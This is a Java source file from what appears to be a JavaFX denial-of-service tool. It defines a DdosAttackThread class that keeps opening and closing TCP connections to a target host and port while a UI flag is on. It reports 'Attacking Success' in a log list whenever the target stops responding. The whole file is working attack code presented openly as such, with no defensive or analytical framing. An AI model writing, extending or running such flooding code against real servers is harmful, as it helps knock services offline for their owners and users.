package sample;

import javafx.application.Platform;
import javafx.scene.control.Label;

import java.io.IOException;
import java.net.*;
import java.util.concurrent.atomic.AtomicBoolean;

public class DdosAttackThread implements Runnable {
    public URL url;
    public int delay;
    ButtonController buttonController;

    public DdosAttackThread(URL request, int delay, ButtonController controller) throws Exception{
            this.url = request;
            this.buttonController = controller;
            this.delay = delay;
    }

    public boolean getStatus() {
        return buttonController.status.get();
    }

    @Override
    public void run() {
        while (getStatus()) {
            try {
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(this.url.getHost() , this.url.getPort()), delay);
                Thread.sleep(100);
                socket.close();
                Label label = new Label( "Server is Responding --> Attack Failure");
                label.setStyle("-fx-text-fill: green; ");
                updateLabel(label);
            }
            catch (SocketTimeoutException e){
                System.out.println("Socket Timeout Exception "+ e.getMessage());
                Label label = new Label( "Server is not Responding --> Attacking Success  ");
                label.setStyle("-fx-text-fill: red; ");
                updateLabel(label);
            }catch (IOException e){
                System.out.println("IO Exception unable to connect "+ e.getMessage());
                Label label = new Label( "Server is not Responding --> Attacking Success ");
                label.setStyle("-fx-text-fill: red; ");
                updateLabel(label);
            }
            catch (Exception e) {
//                System.out.println("there is an error "+ e.printStackTrace(););
                e.printStackTrace();
                Label label = new Label( "Attacking Success --> "+ e.getMessage());
                label.setStyle("-fx-text-fill: red; ");
                updateLabel(label);
            }
        }
    }
    public void updateLabel(Label label){
        try{
            Platform.runLater(() -> {
                if (buttonController.logs.size()>1000){
                    buttonController.logs.remove(0);
                }
                buttonController.logs.add(label);
                buttonController.log_list.scrollTo(buttonController.logs.size() - 1);
            });

        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
